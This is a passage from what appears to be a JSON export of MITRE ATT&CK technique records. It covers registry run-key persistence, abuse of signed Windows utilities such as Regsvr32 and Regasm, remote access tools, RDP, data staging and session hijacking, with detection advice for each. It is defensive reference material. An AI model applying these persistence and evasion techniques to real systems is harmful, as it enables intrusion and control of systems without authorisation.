<code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\User Shell Folders</code>\\n\\nThe following Registry keys can control automatic startup of services during boot:\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce</code>\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices</code>\\n\\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\\n* <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n* <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\Run</code>\\n\\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Shell</code> subkeys can automatically launch programs.\\n\\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows</code> run when any user logs on.\\n\\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\\n\\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.\",\"external_references\":[{\"external_id\":\"T1547.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1547/001\"},{\"external_id\":\"CAPEC-270\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/270.html\"},{\"description\":\"Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.\",\"source_name\":\"Microsoft Run Key\",\"url\":\"http://msdn.microsoft.com/en-us/library/aa376977\"},{\"description\":\"Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018.\",\"source_name\":\"Microsoft RunOnceEx APR 2018\",\"url\":\"https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key\"},{\"description\":\"Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018.\",\"source_name\":\"Oddvar Moe RunOnceEx Mar 2018\",\"url\":\"https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/\"},{\"description\":\"Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.\",\"source_name\":\"TechNet Autoruns\",\"url\":\"https://technet.microsoft.com/en-us/sysinternals/bb963902\"}],\"id\":\"attack-pattern--9efb1ea7-c37b-4595-9640-b7680cd84279\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-25T16:16:26.182Z\",\"name\":\"Registry Run Keys / Startup Folder\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Oddvar Moe, @oddvarmoe\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys\' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\\n\\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:33.499Z\",\"external_references\":[{\"external_id\":\"T1121\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1121\"},{\"description\":\"Microsoft. (n.d.). Regsvcs.exe (.NET Services Installation Tool). Retrieved July 1, 2016.\",\"source_name\":\"MSDN Regsvcs\",\"url\":\"https://msdn.microsoft.com/en-us/library/04za0hca.aspx\"},{\"description\":\"Microsoft. (n.d.). Regasm.exe (Assembly Registration Tool). Retrieved July 1, 2016.\",\"source_name\":\"MSDN Regasm\",\"url\":\"https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx\"},{\"description\":\"LOLBAS. (n.d.). Regsvcs.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Regsvcs\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/\"},{\"description\":\"LOLBAS. (n.d.). Regasm.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Regasm\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Regasm/\"}],\"id\":\"attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302\",\"modified\":\"2020-01-31T19:00:30.734Z\",\"name\":\"Regsvcs/Regasm\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T19:42:16.439Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\\n\\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)\",\"external_references\":[{\"external_id\":\"T1218.009\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/009\"},{\"description\":\"Microsoft. (n.d.). Regsvcs.exe (.NET Services Installation Tool). Retrieved July 1, 2016.\",\"source_name\":\"MSDN Regsvcs\",\"url\":\"https://msdn.microsoft.com/en-us/library/04za0hca.aspx\"},{\"description\":\"Microsoft. (n.d.). Regasm.exe (Assembly Registration Tool). Retrieved July 1, 2016.\",\"source_name\":\"MSDN Regasm\",\"url\":\"https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx\"},{\"description\":\"LOLBAS. (n.d.). Regsvcs.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Regsvcs\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/\"},{\"description\":\"LOLBAS. (n.d.). Regasm.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Regasm\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Regasm/\"}],\"id\":\"attack-pattern--c48a67ee-b657-45c1-91bf-6cdbe27205f8\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:36:37.411Z\",\"name\":\"Regsvcs/Regasm\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Casey Smith\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\",\"Application control\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:26.966Z\",\"external_references\":[{\"external_id\":\"T1117\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1117\"},{\"description\":\"Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.\",\"source_name\":\"Microsoft Regsvr32\",\"url\":\"https://support.microsoft.com/en-us/kb/249873\"},{\"description\":\"LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Regsvr32\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\"},{\"description\":\"Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS Tools to “Live off the Land”. Retrieved April 9, 2018.\",\"source_name\":\"Carbon Black Squiblydoo Apr 2016\",\"url\":\"https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/\"},{\"description\":\"Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.\",\"source_name\":\"FireEye Regsvr32 Targeting Mongolian Gov\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html\"}],\"id\":\"attack-pattern--68f7e3a1-f09f-4164-9a62-16b648a0dd5a\",\"modified\":\"2020-01-31T19:00:56.475Z\",\"name\":\"Regsvr32\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T19:52:17.414Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)\\n\\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \\\"Squiblydoo\\\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\\n\\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)\",\"external_references\":[{\"external_id\":\"T1218.010\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/010\"},{\"description\":\"Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.\",\"source_name\":\"Microsoft Regsvr32\",\"url\":\"https://support.microsoft.com/en-us/kb/249873\"},{\"description\":\"LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.\",\"source_name\":\"LOLBAS Regsvr32\",\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/\"},{\"description\":\"Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo” Continues Trend of Attackers Using Native OS Tools to “Live off the Land”. Retrieved April 9, 2018.\",\"source_name\":\"Carbon Black Squiblydoo Apr 2016\",\"url\":\"https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/\"},{\"description\":\"Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.\",\"source_name\":\"FireEye Regsvr32 Targeting Mongolian Gov\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html\"}],\"id\":\"attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:37:32.931Z\",\"name\":\"Regsvr32\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Casey Smith\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"Process command-line parameters\",\"Process monitoring\",\"Loaded DLLs\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\",\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\\n\\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\\n\\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)\",\"external_references\":[{\"external_id\":\"T1219\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1219\"},{\"description\":\"Wueest, C., Anand, H. (2017, July). Living off the land and fileless attack techniques. Retrieved April 10, 2018.\",\"source_name\":\"Symantec Living off the Land\",\"url\":\"https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/istr-living-off-the-land-and-fileless-attack-techniques-en.pdf\"},{\"description\":\"CrowdStrike Intelligence. (2016). 2015 Global Threat Report. Retrieved April 11, 2018.\",\"source_name\":\"CrowdStrike 2015 Global Threat Report\",\"url\":\"https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf\"},{\"description\":\"CrySyS Lab. (2013, March 20). TeamSpy – Obshie manevri. Ispolzovat’ tolko s razreshenija S-a. Retrieved April 11, 2018.\",\"source_name\":\"CrySyS Blog TeamSpy\",\"url\":\"https://blog.crysys.hu/2013/03/teamspy/\"}],\"id\":\"attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-06-20T20:42:37.320Z\",\"name\":\"Remote Access Software\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matt Kelly, @breakersall\"],\"x_mitre_data_sources\":[\"Network intrusion detection system\",\"Network protocol analysis\",\"Process use of network\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.\\n\\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.\\n\\n[Domain Fronting](https://attack.mitre.org/techniques/T1090/004) may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"Windows\",\"macOS\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2020-03-13T21:14:58.206Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\\n\\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\\n\\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.\",\"external_references\":[{\"external_id\":\"T1074.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1074/002\"},{\"description\":\"FireEye / Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.\",\"source_name\":\"Mandiant M-Trends 2020\",\"url\":\"https://content.fireeye.com/m-trends/rpt-m-trends-2020\"}],\"id\":\"attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-06-24T18:59:15.833Z\",\"name\":\"Remote Data Staging\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\\n\\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:59.769Z\",\"external_references\":[{\"external_id\":\"T1076\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1076\"},{\"external_id\":\"CAPEC-555\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/555.html\"},{\"description\":\"Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.\",\"source_name\":\"TechNet Remote Desktop Services\",\"url\":\"https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx\"},{\"description\":\"Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.\",\"source_name\":\"Alperovitch Malware\",\"url\":\"http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/\"},{\"description\":\"Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking Feature All Windows versions. Retrieved December 11, 2017.\",\"source_name\":\"RDP Hijacking Korznikov\",\"url\":\"http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html\"},{\"description\":\"Beaumont, K. (2017, March 19). RDP hijacking\u{200a}—\u{200a}how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.\",\"source_name\":\"RDP Hijacking Medium\",\"url\":\"https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\"},{\"description\":\"NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December 11, 2017.\",\"source_name\":\"Kali Redsnarf\",\"url\":\"https://github.com/nccgroup/redsnarf\"}],\"id\":\"attack-pattern--51dea151-0898-4a45-967c-3ebee0420484\",\"modified\":\"2020-02-11T18:24:04.507Z\",\"name\":\"Remote Desktop Protocol\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-11T18:23:26.059Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\\n\\nRemote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) \\n\\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) technique for Persistence.(Citation: Alperovitch Malware)\",\"external_references\":[{\"external_id\":\"T1021.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1021/001\"},{\"external_id\":\"CAPEC-555\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/555.html\"},{\"description\":\"Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1, 2016.\",\"source_name\":\"TechNet Remote Desktop Services\",\"url\":\"https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx\"},{\"description\":\"Alperovitch, D. (2014, October 31). Malware-Free Intrusions. Retrieved November 4, 2014.\",\"source_name\":\"Alperovitch Malware\",\"url\":\"http://blog.crowdstrike.com/adversary-tricks-crowdstrike-treats/\"}],\"id\":\"attack-pattern--eb062747-2193-45de-8fa2-e62549c37ddf\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-02-25T19:23:34.204Z\",\"name\":\"Remote Desktop Protocol\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matthew Demaske, Adaptforward\"],\"x_mitre_data_sources\":[\"Process monitoring\",\"Netflow/Enclave netflow\",\"Authentication logs\"],\"x_mitre_detection\":\"Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Remote Desktop Users\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"RDP service enabled, account in the Remote Desktop Users group\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-19T18:52:24.547Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may target an Exchange server or Office 365 to collect sensitive information. Adversaries may leverage a user\'s credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.\",\"external_references\":[{\"external_id\":\"T1114.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1114/002\"}],\"id\":\"attack-pattern--b4694861-542c-48ea-9eb1-10d356e7140a\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-02-19T20:53:50.908Z\",\"name\":\"Remote Email Collection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"Email gateway\",\"Mail server\",\"Office 365 trace logs\"],\"x_mitre_detection\":\"Monitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Office 365\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-25T18:26:16.994Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\\n\\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)\",\"external_references\":[{\"external_id\":\"T1563\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1563\"},{\"description\":\"Beaumont, K. (2017, March 19). RDP hijacking\u{200a}—\u{200a}how to hijack RDS and RemoteApp sessions transparently to move through an organisation. Retrieved December 11, 2017.\",\"source_name\":\"RDP Hijacking Medium\",\"url\":\"https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6\"},{\"description\":\"Hodgson, M. (2019, May 8). Post-mortem and remediations for Apr 11 security incident. Retrieved February 17, 2020.\",\"source_name\":\"Breach Post-mortem SSH Hijack\",\"url\":\"https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident\"}],\"id\":\"attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T23:35:58.129Z\",\"name\":\"Remote Service Session Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Netflow/Enclave netflow\",\"Authentication logs\"],\"x_mitre_detection\":\"Use of these services may be legitimate, depending upon the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with that service. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.\\n\\nMonitor for processes and command-line arguments associated with hijacking service sessions.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"SYSTEM\",\"root\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:29.858Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\\n\\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop 